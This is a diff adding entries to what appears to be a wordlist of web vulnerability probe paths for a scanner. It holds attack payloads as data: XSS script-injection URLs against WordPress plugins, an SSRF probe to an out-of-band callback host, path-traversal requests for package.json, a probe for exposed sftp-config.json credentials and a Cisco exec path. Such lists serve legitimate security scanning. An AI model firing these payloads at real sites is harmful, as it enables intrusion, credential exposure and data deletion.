@@ -11061,3 +11061,10 @@ request?info=<svg onload=alert(
 /wp-admin/options-general.php?page=updraftplus&job_id&updraft_restore%5B0%5D=%3Cscript%3Ealert%28/XSS/%29%3C%2Fscript%3E&action=updraft_restore&backup_timestamp=123&updraftplus_ajax_restore=start_ajax_restore
 /?s=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
 /wp-admin/edit.php?post_type=download&page=edd-payment-history&payment%5B0%5D=1&payment%5B1%5D=2&action=delete
+/v1/avatars/favicon?url=http://{{interactsh-url}}
+/level/16/exec/show/config/CR
+/sftp-config.json
+/assets/built%2F..%2F..%2F/package.json
+/assets/built%2F..%2F..%2F%E0%A4%A/package.json
+/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-admin/admin.php?page=simple_wp_membership_payments&action=delete_txn&id=1
